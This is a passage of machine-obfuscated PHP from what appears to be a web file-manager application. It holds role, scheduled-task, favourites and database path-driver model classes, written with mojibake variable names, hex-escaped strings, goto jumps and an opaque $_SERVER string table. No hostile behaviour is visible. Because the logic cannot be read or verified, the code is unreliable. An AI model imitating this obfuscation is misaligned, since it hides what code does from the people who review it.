(!$ãğ“‚¯É) { return $ë¸Ì’ŠÊ; } echo $ë¸Ì’ŠÊ; } public function link($„ğÇï—‚ = false, $Ì¢ë°ü¢ = '') { $ºèæç =& $_SERVER[Î‹ÃÂŞ„]; if (!$„ğÇï—‚) { $this->link($ºèæç[1635], $ºèæç[1633]); $this->link($ºèæç[1636], $ºèæç[1632]); $this->link($ºèæç[1637], $ºèæç[1632]); $this->link($ºèæç[1638], $ºèæç[1632]); $this->link($ºèæç[1639], $ºèæç[1632]); return; } $Ç¢ôØÒ¹ = $this->url($„ğÇï—‚, $Ì¢ë°ü¢, !1); if (substr($„ğÇï—‚, -3) == $ºèæç[1640]) { echo $ºèæç[1641] . $Ç¢ôØÒ¹ . $ºèæç[1642] . $ºèæç[248]; } else { if (substr($„ğÇï—‚, -4) == $ºèæç[1643]) { echo $ºèæç[1644] . $Ç¢ôØÒ¹ . $ºèæç[1645] . $ºèæç[248]; } } } } goto CöŠ»Ûáé; cØĞ¹Šãˆå: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\162\157\154\145\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\141\x75\164\x68", "\x6c\141\142\x65\154", "\144\151\x73\160\x6c\x61\171", "\x73\171\163\164\145\x6d", "\144\145\x73\143", "\151\147\x6e\x6f\x72\145\105\x78\x74", "\x69\x67\x6e\157\x72\x65\106\x69\x6c\145\123\x69\172\145", "\x61\x64\155\x69\156\151\163\x74\162\x61\x74\x6f\x72", "\x73\x6f\x72\x74"); public function listData($Ïƒ™­¢• = false, $ñŸÆò¼¼ = "\x73\157\x72\164", $í–µÆ—ã = false) { $ş‡©‘õÙ =& $_SERVER[Î‹ÃÂŞ„]; $Ñì‚—àŸ = parent::listData($Ïƒ™­¢•, $ñŸÆò¼¼, $í–µÆ—ã); if (!$Ïƒ™­¢•) { foreach ($Ñì‚—àŸ as $…‚”Î–Ñ => $íÊ«°ƒ£) { if ($íÊ«°ƒ£[$ş‡©‘õÙ[2105]] == 1) { $Ñì‚—àŸ[$…‚”Î–Ñ][$ş‡©‘õÙ[496]] = LNG($ş‡©‘õÙ[2345]); } } } return $Ñì‚—àŸ; } public function update($Ñ®Şú· , $Œç ÉÂ) { $ıœ–ºƒ =& $_SERVER[Î‹ÃÂŞ„]; $Á·Ò¹·à = parent::listData($Ñ®Şú· ); $Å©Š€ = $this->findByName($Œç ÉÂ[$ıœ–ºƒ[32]]); if (!$Á·Ò¹·à || $Å©Š€ && $Å©Š€[$ıœ–ºƒ[445]] != $Á·Ò¹·à[$ıœ–ºƒ[445]]) { return !1; } if ($Å©Š€[$ıœ–ºƒ[2105]] == 1) { $Œç ÉÂ = array($ıœ–ºƒ[32] => $Œç ÉÂ[$ıœ–ºƒ[32]], $ıœ–ºƒ[1925] => $Œç ÉÂ[$ıœ–ºƒ[1925]]); } $this->filterAuth($Œç ÉÂ[$ıœ–ºƒ[457]]); return parent::update($Ñ®Şú· , $Œç ÉÂ); } public function remove($¾‰ÔØÀµ) { $Õ‡©üÑå = parent::listData($¾‰ÔØÀµ); if (!$Õ‡©üÑå || $Õ‡©üÑå[$_SERVER[Î‹ÃÂŞ„][181]]) { return !1; } return parent::remove($¾‰ÔØÀµ); } public function add($£ªù²×é) { $ŞŸ´ç•Å =& $_SERVER[Î‹ÃÂŞ„]; $ººŞ½¡· = $£ªù²×é[$ŞŸ´ç•Å[32]]; if ($this->findByName($ººŞ½¡·)) { return !1; } $äÌåê‡ = array($ŞŸ´ç•Å[464] => $ººŞ½¡·, $ŞŸ´ç•Å[1908] => $ŞŸ´ç•Å[12], $ŞŸ´ç•Å[1904] => $ŞŸ´ç•Å[1912], $ŞŸ´ç•Å[2346] => 1, $ŞŸ´ç•Å[1907] => 0, $ŞŸ´ç•Å[2347] => 0, $ŞŸ´ç•Å[1906] => $this->getSort()); $£ªù²×é = array_merge($äÌåê‡, $£ªù²×é); $this->filterAuth($£ªù²×é[$ŞŸ´ç•Å[457]]); return parent::insert($£ªù²×é); } private function getSort() { $Ö¬İ–Èş =& $_SERVER[Î‹ÃÂŞ„]; $°ÉâØÇé = parent::listData(); $¼°è® = array_to_keyvalue($°ÉâØÇé, $Ö¬İ–Èş[12], $Ö¬İ–Èş[1926]); return empty($¼°è®) ? 0 : max($¼°è®) + 1; } private function filterAuth(&$ÏÆ—¡Î) { $¨û¢†ö˜ =& $_SERVER[Î‹ÃÂŞ„]; $†ğ–Ë = array(); $³©ÒÆ Ë = array_filter(explode($¨û¢†ö˜[50], $ÏÆ—¡Î)); foreach ($³©ÒÆ Ë as $ÏÆ—¡Î) { $’˜’øÍé = explode($¨û¢†ö˜[10], $ÏÆ—¡Î); if ($’˜’øÍé[0] == $¨û¢†ö˜[2348] && $’˜’øÍé[1] != $¨û¢†ö˜[1245]) { $²Ğ‡ÆÆ´ = $’˜’øÍé[0] . $¨û¢†ö˜[10] . $’˜’øÍé[1] . $¨û¢†ö˜[2349]; if (!in_array($²Ğ‡ÆÆ´, $³©ÒÆ Ë)) { $†ğ–Ë[] = $²Ğ‡ÆÆ´; } } $†ğ–Ë[] = $ÏÆ—¡Î; } $ÏÆ—¡Î = implode($¨û¢†ö˜[50], $†ğ–Ë); } public function findRoleDefault() { $¯‰½ŸÜ´ =& $_SERVER[Î‹ÃÂŞ„]; $ËÂ§Ã = parent::listData(); $â›»³æÙ = !1; foreach ($ËÂ§Ã as $ÆŸ£ßÑÁ) { if (!$ÆŸ£ßÑÁ || $ÆŸ£ßÑÁ[$¯‰½ŸÜ´[1924]] == $¯‰½ŸÜ´[214] || $ÆŸ£ßÑÁ[$¯‰½ŸÜ´[2105]] == 1) { continue; } if (strstr($ÆŸ£ßÑÁ[$¯‰½ŸÜ´[457]], $¯‰½ŸÜ´[2350])) { continue; } if (!strstr($ÆŸ£ßÑÁ[$¯‰½ŸÜ´[457]], $¯‰½ŸÜ´[2351])) { continue; } if (!$â›»³æÙ) { $â›»³æÙ = $ÆŸ£ßÑÁ; continue; } $ÈŒ¿Íˆë = explode($¯‰½ŸÜ´[50], $â›»³æÙ[$¯‰½ŸÜ´[457]]); $¾–½ÙÄÒ = explode($¯‰½ŸÜ´[50], $ÆŸ£ßÑÁ[$¯‰½ŸÜ´[457]]); if (count($ÈŒ¿Íˆë) > count($¾–½ÙÄÒ)) { $â›»³æÙ = $ÆŸ£ßÑÁ; } } return $â›»³æÙ ? $â›»³æÙ[$¯‰½ŸÜ´[445]] : $¯‰½ŸÜ´[12]; } public function sort($ÆÑ€”ÉÄ, $¡¯¶Ÿµï) { return parent::update($ÆÑ€”ÉÄ, $¡¯¶Ÿµï); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x74\x61\163\x6b\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\164\171\x70\x65", "\145\166\x65\x6e\x74", "\164\x69\155\x65", "\x64\145\163\143", "\x73\171\x73\x74\x65\155", "\x65\x6e\141\x62\x6c\145", "\x6c\141\163\x74\122\x75\x6e", "\x73\157\162\x74"); public function listData($ã¦èïãì = false, $Å¹šŠõ = "\163\x6f\x72\x74", $èãÂ•†• = false) { return parent::listData($ã¦èïãì, $Å¹šŠõ, $èãÂ•†•); } public function add($èôóäµ) { $ŠûİÉôÜ =& $_SERVER[Î‹ÃÂŞ„]; $¡Ùã³æÕ = $this->findByName($èôóäµ[$ŠûİÉôÜ[32]]); if ($¡Ùã³æÕ) { return !1; } $èôóäµ[$ŠûİÉôÜ[1661]] = 0; $èôóäµ[$ŠûİÉôÜ[1926]] = $this->getSort(); return parent::insert($èôóäµ); } private function getSort() { $ÙòªÓ‘ =& $_SERVER[Î‹ÃÂŞ„]; $ŸƒÆŞşÖ = parent::listData(); $Ò’à¶‰Æ = array_to_keyvalue($ŸƒÆŞşÖ, $ÙòªÓ‘[12], $ÙòªÓ‘[1926]); return empty($Ò’à¶‰Æ) ? 0 : max($Ò’à¶‰Æ) + 1; } public function update($¤¹·ş±Í, $íóÑæ†ê) { $™ø¬¡§Œ =& $_SERVER[Î‹ÃÂŞ„]; $—ß´”—‹ = $this->listData($¤¹·ş±Í); $¼şá¡ = $this->findByName($íóÑæ†ê[$™ø¬¡§Œ[32]]); if (!$—ß´”—‹ || $¼şá¡ && $¼şá¡[$™ø¬¡§Œ[445]] != $—ß´”—‹[$™ø¬¡§Œ[445]]) { return !1; } return parent::update($¤¹·ş±Í, $íóÑæ†ê); } public function remove($÷«Úø“¢, $úˆ—çÚŞ = false) { $Œ—ƒ„­÷ =& $_SERVER[Î‹ÃÂŞ„]; $¨±Ï¥Ç´ = $this->listData($÷«Úø“¢); if (!$¨±Ï¥Ç´) { return; } if (!$úˆ—çÚŞ && $¨±Ï¥Ç´[$Œ—ƒ„­÷[181]] == $Œ—ƒ„­÷[90]) { return !1; } return parent::remove($÷«Úø“¢); } public function enable($ı§„€Ë, $—š Š‚) { return $this->update($ı§„€Ë, array($_SERVER[Î‹ÃÂŞ„][2340] => $—š Š‚)); } public function run($’¶¸í±) { return $this->update($’¶¸í±, array($_SERVER[Î‹ÃÂŞ„][2352] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($ÎüÖï–Ò) { $¼ÎÃö« =& $_SERVER[Î‹ÃÂŞ„]; return array($¼ÎÃö«[2013] => array(USER_ID, $¼ÎÃö«[2353])); } protected function listData() { $¤øÀÖ©ä =& $_SERVER[Î‹ÃÂŞ„]; $ÚÍ°£ë = array($¤øÀÖ©ä[1695] => USER_ID, $¤øÀÖ©ä[528] => 0); $ÃªÕèñœ = $¤øÀÖ©ä[2354]; $½®€é• = $this->field($ÃªÕèñœ)->where($ÚÍ°£ë)->order($¤øÀÖ©ä[2355])->select(); return $½®€é• ? $½®€é• : array(); } protected function resetCache() { } protected function listView() { $£¸ÇÍ¸‡ =& $_SERVER[Î‹ÃÂŞ„]; $ˆ¯…¢¶¤ = $this->listData(); $£öÑ¨ÂÌ = array_filter_by_field($ˆ¯…¢¶¤, $£¸ÇÍ¸‡[33], $£¸ÇÍ¸‡[460]); $œÈÎ‚áü = array_to_keyvalue($£öÑ¨ÂÌ, $£¸ÇÍ¸‡[12], $£¸ÇÍ¸‡[86]); if (!$œÈÎ‚áü) { return $ˆ¯…¢¶¤; } $°‚¼¨Ô = 2000; $œÇÎô¾« = array($£¸ÇÍ¸‡[461] => array($£¸ÇÍ¸‡[462], $œÈÎ‚áü)); $ÍÇŒ×„‰ = Model($£¸ÇÍ¸‡[872])->listSource($œÇÎô¾«, $°‚¼¨Ô); $ÍÇŒ×„‰ = array_merge($ÍÇŒ×„‰[$£¸ÇÍ¸‡[85]], $ÍÇŒ×„‰[$£¸ÇÍ¸‡[84]]); $ÍÇŒ×„‰ = array_to_keyvalue($ÍÇŒ×„‰, $£¸ÇÍ¸‡[183]); foreach ($ˆ¯…¢¶¤ as $±Ù…æÂÂ => $Œéíö»ß) { $ìÅ­…Å¼ = $ÍÇŒ×„‰[$Œéíö»ß[$£¸ÇÍ¸‡[86]]]; $ìÅ­…Å¼ = $ìÅ­…Å¼ ? $ìÅ­…Å¼ : array(); $ˆ¯…¢¶¤[$±Ù…æÂÂ] = array_merge($ìÅ­…Å¼, $Œéíö»ß); } return $ˆ¯…¢¶¤; } protected function addFav($‹˜ÔØÛú, $¿ÌÉ£§ = '', $´¾“†‹” = "\163\x6f\165\x72\x63\x65") { $Á•ˆâğ† =& $_SERVER[Î‹ÃÂŞ„]; $µ¢›®˜ä = array($Á•ˆâğ†[1695] => USER_ID, $Á•ˆâğ†[528] => 0, $Á•ˆâğ†[466] => $´¾“†‹”, $Á•ˆâğ†[465] => $‹˜ÔØÛú); if ($this->where($µ¢›®˜ä)->find()) { return !1; } $µ¢›®˜ä = array($Á•ˆâğ†[1695] => USER_ID, $Á•ˆâğ†[528] => 0); $¼ıš‚Î€ = $this->where($µ¢›®˜ä)->max($Á•ˆâğ†[1926]); if (!$¼ıš‚Î€) { $¼ıš‚Î€ = 0; } if (!$¿ÌÉ£§ && $´¾“†‹” == $Á•ˆâğ†[460]) { $ºòµ¡¡¯ = Model($Á•ˆâğ†[1388])->where(array($Á•ˆâğ†[461] => $‹˜ÔØÛú))->find(); if (!$ºòµ¡¡¯) { return !1; } $¿ÌÉ£§ = $ºòµ¡¡¯[$Á•ˆâğ†[32]]; } $¿ÌÉ£§ = $this->getAutoName($¿ÌÉ£§); $§æ ŸêÉ = array($Á•ˆâğ†[1695] => USER_ID, $Á•ˆâğ†[528] => 0, $Á•ˆâğ†[464] => $¿ÌÉ£§, $Á•ˆâğ†[465] => $‹˜ÔØÛú, $Á•ˆâğ†[466] => $´¾“†‹”, $Á•ˆâğ†[1906] => $¼ıš‚Î€ + 1); return $this->add($§æ ŸêÉ); } protected function remove($¢—×Û‚) { $¶ú´ß€è =& $_SERVER[Î‹ÃÂŞ„]; $Œ‘ùÎí® = array($¶ú´ß€è[1695] => USER_ID, $¶ú´ß€è[463] => $¢—×Û‚); return $this->where($Œ‘ùÎí®)->delete(); } protected function removeByName($«ş˜©üü) { $Ş°ë­‹Ö =& $_SERVER[Î‹ÃÂŞ„]; $±È¥éÒƒ = array($Ş°ë­‹Ö[1695] => USER_ID, $Ş°ë­‹Ö[464] => $«ş˜©üü, $Ş°ë­‹Ö[528] => 0); return $this->where($±È¥éÒƒ)->delete(); } protected function rename($ùŒ¦Æçş, $İˆâ®ãŞ) { $³¡½û² =& $_SERVER[Î‹ÃÂŞ„]; if ($ùŒ¦Æçş == $İˆâ®ãŞ) { return !1; } $à®ª•‚ù = $this->getAutoName($İˆâ®ãŞ); if ($İˆâ®ãŞ != $à®ª•‚ù) { return !1; } $Ê´º÷ù¢ = array($³¡½û²[1695] => USER_ID, $³¡½û²[528] => 0, $³¡½û²[32] => $ùŒ¦Æçş); return $this->where($Ê´º÷ù¢)->save(array($³¡½û²[32] => $İˆâ®ãŞ)); } protected function resetSort($§ÛÚ–¼˜) { $Ï¡Äß’ñ =& $_SERVER[Î‹ÃÂŞ„]; $§ÛÚ–¼˜ = is_array($§ÛÚ–¼˜) ? $§ÛÚ–¼˜ : array(); $¨Êüô¨ = array($Ï¡Äß’ñ[1695] => USER_ID); for ($î€äğş = 0; $î€äğş < count($§ÛÚ–¼˜); $î€äğş++) { $¨Êüô¨[$Ï¡Äß’ñ[463]] = $§ÛÚ–¼˜[$î€äğş]; $this->where($¨Êüô¨)->save(array($Ï¡Äß’ñ[1906] => $î€äğş + 1)); } return !0; } protected function moveTop($ãâ‰ÔÍ) { $İ‰¥İ¦Ş =& $_SERVER[Î‹ÃÂŞ„]; $™ÓŠšíş = array($İ‰¥İ¦Ş[1695] => USER_ID, $İ‰¥İ¦Ş[528] => 0); $Å—•Şó = $this->where($™ÓŠšíş)->where(array($İ‰¥İ¦Ş[32] => $ãâ‰ÔÍ))->find(); if (!$Å—•Şó) { return; } $¼Ó¯ó‡Ä = $this->field($İ‰¥İ¦Ş[445])->where($™ÓŠšíş)->order($İ‰¥İ¦Ş[2355])->select(); $¼Ó¯ó‡Ä = array_to_keyvalue($¼Ó¯ó‡Ä, $İ‰¥İ¦Ş[12], $İ‰¥İ¦Ş[445]); $§êÃù”¡ = $¼Ó¯ó‡Ä; $¼Ó¯ó‡Ä = array_remove_value($¼Ó¯ó‡Ä, $Å—•Şó[$İ‰¥İ¦Ş[445]]); array_unshift($¼Ó¯ó‡Ä, $Å—•Şó[$İ‰¥İ¦Ş[445]]); return $this->resetSort($¼Ó¯ó‡Ä); } protected function moveBottom($µ‹ã¦‘) { $ÚÀŒ•Š =& $_SERVER[Î‹ÃÂŞ„]; $‡“ôûª— = array($ÚÀŒ•Š[1695] => USER_ID, $ÚÀŒ•Š[528] => 0); $˜Îïñùª = $this->where($‡“ôûª—)->max($ÚÀŒ•Š[1926]); $ººá¥‹ = array($ÚÀŒ•Š[1926] => $˜Îïñùª + 1); return $this->where($‡“ôûª—)->where(array($ÚÀŒ•Š[32] => $µ‹ã¦‘))->save($ººá¥‹); } private function getAutoName($ôÚí…åÍ) { $µ‡è¿Õ² =& $_SERVER[Î‹ÃÂŞ„]; $¨ñç·å = array($µ‡è¿Õ²[1695] => USER_ID, $µ‡è¿Õ²[528] => 0); $ßƒÔ¾á = $this->field($µ‡è¿Õ²[32])->where($¨ñç·å)->select(); $ßƒÔ¾á = array_to_keyvalue($ßƒÔ¾á, $µ‡è¿Õ²[12], $µ‡è¿Õ²[32]); if (!$ßƒÔ¾á || !in_array($ôÚí…åÍ, $ßƒÔ¾á)) { return $ôÚí…åÍ; } for ($ÄƒûãÒ“ = 0; $ÄƒûãÒ“ < count($ßƒÔ¾á); $ÄƒûãÒ“++) { if (!in_array($ôÚí…åÍ . "\50{$ÄƒûãÒ“}\51", $ßƒÔ¾á)) { return $ôÚí…åÍ . "\50{$ÄƒûãÒ“}\x29"; } } return $ôÚí…åÍ . "\50{$ÄƒûãÒ“}\51"; } } goto AÏù”½ÍÚË; BÃ¸æË‡ˆÀ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ŞÈûŸ©‚) { $this->pathParse = $ŞÈûŸ©‚; $this->model = Model($_SERVER[Î‹ÃÂŞ„][1388]); } public function getPath($È‹©ûŸ) { return trim($È‹©ûŸ, $_SERVER[Î‹ÃÂŞ„][8]); } public function pathFather($ˆ âø€å) { $ë ÇğÁ‰ = $this->parse($ˆ âø€å); $ë ÇğÁ‰ = $this->infoSimple($ˆ âø€å); return $ë ÇğÁ‰ ? $ë ÇğÁ‰[$_SERVER[Î‹ÃÂŞ„][182]] : !1; } public function pathThis($ïó¼¦¬å) { $ï«¿ºİª = $this->infoSimple($ïó¼¦¬å); return $ï«¿ºİª ? $ï«¿ºİª[$_SERVER[Î‹ÃÂŞ„][32]] : !1; } public function getPathOuter($è°Û¤Å) { if (!$è°Û¤Å) { return $è°Û¤Å; } $½Ó§®¤ = $this->parse($è°Û¤Å); return KodIO::make($½Ó§®¤[$_SERVER[Î‹ÃÂŞ„][445]]); } public function copyFolderFromIO($£ÈÍôÒ, $È õ«íì, $îÏ½•À‹, $Âı«â¥½, $ÙÅëí) { $óü­Ò ‡ = $this->model->copyFolderFromIO($£ÈÍôÒ, $È õ«íì, $îÏ½•À‹, $Âı«â¥½, $ÙÅëí); return KodIO::make($óü­Ò ‡); } public function isParentOf($¸ıÌŞŒ„, $µ¯ùüéÏ) { return $this->model->isParentOf($¸ıÌŞŒ„, $µ¯ùüéÏ); } public function mkfile($˜Ãß•Ü£, $é•½ï¤ = '', $±ğæÑÛı = REPEAT_RENAME) { $¤¨Ä¬ò€ =& $_SERVER[Î‹ÃÂŞ„]; $±Ìş±á„ = $this->parse($˜Ãß•Ü£); $˜Ãß•Ü£ = $±Ìş±á„[$¤¨Ä¬ò€[445]]; for ($›°µãù = 0; $›°µãù < count($±Ìş±á„[$¤¨Ä¬ò€[1389]]); $›°µãù++) { $×§”¡âñ = $±Ìş±á„[$¤¨Ä¬ò€[1389]][$›°µãù]; if ($›°µãù == count($±Ìş±á„[$¤¨Ä¬ò€[1389]]) - 1) { $˜Ãß•Ü£ = $this->model->mkfile($˜Ãß•Ü£, $×§”¡âñ, $é•½ï¤, $±ğæÑÛı); break; } $˜Ãß•Ü£ = $this->model->mkdir($˜Ãß•Ü£, $×§”¡âñ, REPEAT_SKIP); } return $this->getPathOuter($˜Ãß•Ü£); } public function mkdir($Á…†¤ğò, $øÀı±æ¡ = REPEAT_SKIP) { $ÂÄî¾Èá =& $_SERVER[Î‹ÃÂŞ„]; $ãÎÎŞ¯ = $this->parse($Á…†¤ğò); $Á…†¤ğò = $ãÎÎŞ¯[$ÂÄî¾Èá[445]]; for ($Ó¬Æó’Ö = 0; $Ó¬Æó’Ö < count($ãÎÎŞ¯[$ÂÄî¾Èá[1389]]); $Ó¬Æó’Ö++) { $Ğ³×êé¹ = $ãÎÎŞ¯[$ÂÄî¾Èá[1389]][$Ó¬Æó’Ö]; $Á…†¤ğò = $this->model->mkdir($Á…†¤ğò, $Ğ³×êé¹, $øÀı±æ¡); } return $this->getPathOuter($Á…†¤ğò); } public function copyFile($Ïı•Ø·Ì, $ÎòÙ«µ, $ãåŠãğ = REPEAT_REPLACE) { $ì…ÇÄş =& $_SERVER[Î‹ÃÂŞ„]; $œ²Å¹‰· = $this->parse($ÎòÙ«µ); $Â²çÄë  = $this->model->copy($Ïı•Ø·Ì, $œ²Å¹‰·[$ì…ÇÄş[445]], $ãåŠãğ, $œ²Å¹‰·[$ì…ÇÄş[86]]); return $Â²çÄë  ? $this->getPathOuter($Â²çÄë ) : !1; } public function moveFile($şˆ¡ã â, $ß²Ö£×®, $“Ã¡“ç = REPEAT_REPLACE) { $öÍ”úÀü =& $_SERVER[Î‹ÃÂŞ„]; $î¡á‘Â‰ = $this->parse($ß²Ö£×®); $àî¯ÇÂ‚ = $this->model->move($şˆ¡ã â, $î¡á‘Â‰[$öÍ”úÀü[445]], $“Ã¡“ç, $î¡á‘Â‰[$öÍ”úÀü[86]]); return $àî¯ÇÂ‚ ? $this->getPathOuter($àî¯ÇÂ‚) : !1; } public function copy($Â‹¯šü, $Í ¢Ë”˜, $ÛÕôïú³ = REPEAT_REPLACE, $ôØüäÖ– = false) { $Á¹²É¿ı = $this->parse($Í ¢Ë”˜); $ë÷©æí‰ = $this->model->copy($Â‹¯šü, $Á¹²É¿ı[$_SERVER[Î‹ÃÂŞ„][445]], $ÛÕôïú³, $ôØüäÖ–); return $ë÷©æí‰ ? $this->getPathOuter($ë÷©æí‰) : !1; } public function moveSameAllow() { } public function move($İïˆÌ×È, $ÏøÁøĞ¹, $äïã…œÓ = REPEAT_REPLACE, $°À÷•°“ = false) { $ı—ê‡ = $this->parse($ÏøÁøĞ¹); $ÉÆìï¦¦ = $this->model->move($İïˆÌ×È, $ı—ê‡[$_SERVER[Î‹ÃÂŞ„][445]], $äïã…œÓ, $°À÷•°“); return $ÉÆìï¦¦ ? $this->getPathOuter($ÉÆìï¦¦) : !1; } public function remove($‹Š®’Ññ, $“›Øû¶í = true) { return $this->model->remove($‹Š®’Ññ, $“›Øû¶í); } public function rename($¦¦ğûù–, $ï­ŸÜèÓ) { $ÖÍÈïš¦ = $this->model->rename($¦¦ğûù–, $ï­ŸÜèÓ); return $ÖÍÈïš¦ ? $this->getPathOuter($¦¦ğûù–) : $ÖÍÈïš¦; } public function size($‡¬¡´¶Ó) { $ÌÇ€€Æ½ = $this->infoSimple($‡¬¡´¶Ó); return $ÌÇ€€Æ½ ? $ÌÇ€€Æ½[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function infoSimple($÷İ¡Õğâ) { return $this->model->sourceInfo($÷İ¡Õğâ); } public function info($‚µÙ¡Øä) { return $this->infoParse($‚µÙ¡Øä); } public function infoAuth($Ğ¢Îˆô) { return $this->infoParse($Ğ¢Îˆô, !1, !0); } public function infoWithChildren($ƒÄ¥«€š) { return $this->infoParse($ƒÄ¥«€š, !0); } protected function infoParse($ŸÆ°Çü, $¢‘ÛÌÎè = false, $‚ªñèöË = false) { if (!$¢‘ÛÌÎè) { return $this->model->pathInfo($ŸÆ°Çü, $‚ªñèöË); } return $this->model->pathInfoMore($ŸÆ°Çü); } public function infoFullSimple($¾ßÌ¢—„) { $îıë¸‰ =& $_SERVER[Î‹ÃÂŞ„]; $…ôÊÛáœ = explode($îıë¸‰[8], $¾ßÌ¢—„); $³©¥ê© = implode($îıë¸‰[8], array_splice($…ôÊÛáœ, 1)); return $this->model->pathInfoByPath($…ôÊÛáœ[0], $³©¥ê©); } public function infoFull($Œ´ñ€”¾) { $å£Ç‰ı = $this->infoFullSimple($Œ´ñ€”¾); return is_array($å£Ç‰ı) ? $this->model->pathInfo($å£Ç‰ı[$_SERVER[Î‹ÃÂŞ„][183]]) : !1; } public function hashSimple($±õöÕç) { $”’§› ı =& $_SERVER[Î‹ÃÂŞ„]; $‰î“Ğ·ª = $this->infoWithChildren($±õöÕç); return $‰î“Ğ·ª[$”’§› ı[519]][$”’§› ı[643]]; } public function hashMd5($ğú·ƒ×ø) { $¶ìš‡à¿ =& $_SERVER[Î‹ÃÂŞ„]; $û´Äí†µ = $this->infoWithChildren($ğú·ƒ×ø); return $û´Äí†µ[$¶ìš‡à¿[519]][$¶ìš‡à¿[517]]; } public function exist($›©ø¼Àë) { $–ê‰éßÎ =& $_SERVER[Î‹ÃÂŞ„]; $•Òœ’ò€ = $this->parse($›©ø¼Àë); if (!$•Òœ’ò€[$–ê‰éßÎ[86]]) { return $this->isFile($›©ø¼Àë) || $this->isFolder($›©ø¼Àë); } $ŞõïĞ• = array($–ê‰éßÎ[447] => $•Òœ’ò€[$–ê‰éßÎ[445]], $–ê‰éßÎ[32] => $•Òœ’ò€[$–ê‰éßÎ[86]]); $É¹’‰ = $this->model->where($ŞõïĞ•)->find(); return $É¹’‰ ? !0 : !1; } public function isFile($ŒÓ‡âú²) { $“‚°£Üí =& $_SERVER[Î‹ÃÂŞ„]; $ÓÇëÆ¡È = $this->infoSimple($ŒÓ‡âú²); return $ÓÇëÆ¡È && $ÓÇëÆ¡È[$“‚°£Üí[455]] == $“‚°£Üí[214] ? !0 : !1; } public function isFolder($“ş»…‰) { $‘üÔÛùÔ =& $_SERVER[Î‹ÃÂŞ„]; $É®ØÌè¿ = $this->infoSimple($“ş»…‰); return $É®ØÌè¿ && $É®ØÌè¿[$‘üÔÛùÔ[455]] == $‘üÔÛùÔ[90] ? !0 : !1; } public function listPath($Äª‡¨”, $êÍÏÔç = false) { $ÏäÑ´´ü =& $_SERVER[Î‹ÃÂŞ„]; if ($Äª‡¨” == $ÏäÑ´´ü[12]) { return !1; } $›´°ªşÎ = array($ÏäÑ´´ü[447] => $Äª‡¨”); if ($êÍÏÔç) { return $this->model->listSource($›´°ªşÎ, -1); } return $this->model->listSource($›´°ªşÎ); } public function has($ëÔ•¾À, $¢à˜Ç‰÷ = false, $†÷Êƒı = null) { $ò®á ª¸ =& $_SERVER[Î‹ÃÂŞ„]; $ıàíîÖİ = $this->infoWithChildren($ëÔ•¾À); if ($¢à˜Ç‰÷) { return array($ò®á ª¸[226] => $ıàíîÖİ[$ò®á ª¸[226]], $ò®á ª¸[225] => $ıàíîÖİ[$ò®á ª¸[225]]); } return $†÷Êƒı ? $ıàíîÖİ[$ò®á ª¸[226]] : $ıàíîÖİ[$ò®á ª¸[225]]; } public function listAll($â™¸Ü) { $‹ƒÆ·† = IO::info($this->pathParse[$_SERVER[Î‹ÃÂŞ„][86]]); if (!$‹ƒÆ·†) { return array(); } return $this->model->listAll($â™¸Ü); } public function getContent($í«šÇì­) { return $this->model->getContent($í«šÇì­); } public function setContent($Œ¢œÀß°, $ŒÊè¦¼ = '') { return $this->model->setContent($Œ¢œÀß°, $ŒÊè¦¼); } public function fileSubstr($Â¥½èÄó, $ ÷ÂÄµÉ, $Êç²’Ö) { return $this->model->fileSubstr($Â¥½èÄó, $ ÷ÂÄµÉ, $Êç²’Ö); } public function download($‹§¼Æ÷ò, $õ¸‡î¯Ô = '') { $Ø£èù² = get_path_father($õ¸‡î¯Ô); $Û‘Ï§Èï = get_path_this($õ¸‡î¯Ô); $“¨÷Ñ¯ = $this->model->fileInfoGet($‹§¼Æ÷ò); $âûü¯…« = IO::copy($“¨÷Ñ¯[$_SERVER[Î‹ÃÂŞ„][86]], $Ø£èù², !1, $Û‘Ï§Èï); return $âûü¯…«; } public function setModifyTime($„íùÈè, $•Œ‘Ñ¿© = '') { $ÂÙ°Ô×† =& $_SERVER[Î‹ÃÂŞ„]; if (!$„íùÈè) { return; } $this->model->where(array($ÂÙ°Ô×†[461] => $„íùÈè))->save(array($ÂÙ°Ô×†[87] => $•Œ‘Ñ¿©)); } public function upload($¸œ˜Ñ§Á, $¾Ò»‡äÑ, $¬ù›‘Ñ = false, $ñÄ›Ä = REPEAT_REPLACE) { $Ûş¤ù® =& $_SERVER[Î‹ÃÂŞ„]; $³¢£ŒÛ˜ = $this->parse($¸œ˜Ñ§Á); $Ç‰š´°Ü = $this->model->addFile($³¢£ŒÛ˜[$Ûş¤ù®[445]], $¾Ò»‡äÑ, $³¢£ŒÛ˜[$Ûş¤ù®[86]], $¬ù›‘Ñ, $ñÄ›Ä); return $this->getPathOuter($Ç‰š´°Ü); } public function uploadFileByID($²‡²©ğÒ, $åœæŸ‘à, $±ˆ¹³È) { $Ù³ßîê =& $_SERVER[Î‹ÃÂŞ„]; $°·öá = $this->parse($²‡²©ğÒ); $ƒæ¨ãµ° = $this->model->addFileByFileID($°·öá[$Ù³ßîê[445]], $åœæŸ‘à, $°·öá[$Ù³ßîê[86]], $±ˆ¹³È); return $this->getPathOuter($ƒæ¨ãµ°); } public function addFileByRemote($ûÜ±Ôö, $›²Ğæ­, $ÎÏ ©á° = array(), $ºµ´àƒ‘ = '', $¶±şó”ñ) { $¶÷Äš³Ğ =& $_SERVER[Î‹ÃÂŞ„]; $’€ß×Ç† = $this->parse($ûÜ±Ôö); $ºµ´àƒ‘ = empty($ºµ´àƒ‘) ? $’€ß×Ç†[$¶÷Äš³Ğ[86]] : $ºµ´àƒ‘; $Ø¯£Œ­ = $this->model->addFileByRemote($’€ß×Ç†[$¶÷Äš³Ğ[445]], $›²Ğæ­, $ºµ´àƒ‘, $ÎÏ ©á°, $¶±şó”ñ); return $this->getPathOuter($Ø¯£Œ­); } public function uploadLink($µóş’Ï÷, $³çºŸØ = 0) { $¨Ó×¹ş¦ =& $_SERVER[Î‹ÃÂŞ„]; $­Ş–‡øË = $this->parse($µóş’Ï÷); $Ş”ç¥ˆ = _get($GLOBALS[$¨Ó×¹ş¦[7]], 